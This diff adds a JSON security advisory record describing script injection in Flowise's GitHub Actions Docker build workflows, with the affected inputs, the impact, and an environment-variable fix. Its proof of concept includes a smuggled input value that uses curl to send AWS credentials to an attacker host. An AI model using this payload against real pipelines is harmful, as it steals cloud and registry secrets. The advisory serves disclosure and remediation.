@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-jrcq-qjw5-xx5q",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 8.3,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:N/VI:H/VA:N/SC:H/SI:H/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\n\r\n8 script injection vulnerabilities across 3 Docker image build workflows allow a user with write access to steal AWS credentials and Docker Hub tokens by injecting shell commands through workflow_dispatch inputs.\r\n\r\n### Details\r\n\r\nThe following workflow_dispatch inputs are interpolated directly into `run:` blocks using `${{ }}` syntax, which GitHub expands before the shell executes. This allows shell metacharacters in the input to break out of the intended context and run arbitrary commands.\r\n\r\n**FlowiseAI/Flowise:**\r\n- [docker-image-dockerhub.yml lines 26-27](https://github.com/FlowiseAI/Flowise/blob/main/.github/workflows/docker-image-dockerhub.yml#L26) - `node_version`, `tag_version` (secrets: DOCKERHUB_TOKEN)\r\n- [docker-image-ecr.yml lines 39-40](https://github.com/FlowiseAI/Flowise/blob/main/.github/workflows/docker-image-ecr.yml#L39) - `node_version`, `tag_version` (secrets: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)\r\n\r\n**FlowiseAI/FlowiseTestBullMQ:**\r\n- [docker-image.yml lines 51-54](https://github.com/FlowiseAI/FlowiseTestBullMQ/blob/main/.github/workflows/docker-image.yml#L51) - `registry`, `image_type`, `node_version`, `tag_version` (secrets: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, DOCKERHUB_TOKEN)\r\n\r\n### PoC\r\n\r\nA user with write access triggers the workflow via workflow_dispatch with a crafted input:\r\n\r\n**tag_version**: `latest\"; curl https://attacker.com?k=$AWS_ACCESS_KEY_ID&s=$AWS_SECRET_ACCESS_KEY; echo \"`\r\n\r\nThis breaks the shell quoting, executes the curl command with the AWS credentials, and the attacker receives them.\r\n\r\n### Impact\r\n\r\nA compromised contributor account or malicious insider can steal:\r\n- AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY (ECR access, infrastructure)\r\n- DOCKERHUB_TOKEN (push malicious Docker images)\r\n- AWS_OIDC_IAM_ROLE (assume cloud IAM role)\r\n\r\n### Fix\r\n\r\nPass inputs through environment variables instead of direct interpolation:\r\n\r\n```yaml\r\n- env:\r\n    TAG_VERSION: ${{ github.event.inputs.tag_version || 'latest' }}\r\n  run: echo \"$TAG_VERSION\"\r\n\r\n",
+    "ghsa_id": "GHSA-jrcq-qjw5-xx5q",
+    "html_url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-jrcq-qjw5-xx5q",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-jrcq-qjw5-xx5q"
+      }
+    ],
+    "published_at": "2026-08-31T14:01:44Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Script injection in Docker image build workflows allows secret theft",
+    "updated_at": "2026-08-31T14:01:44Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "patched_versions": "3.1.4",
+        "vulnerable_version_range": "<= 3.1.3"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "FlowiseAI/Flowise"
+}
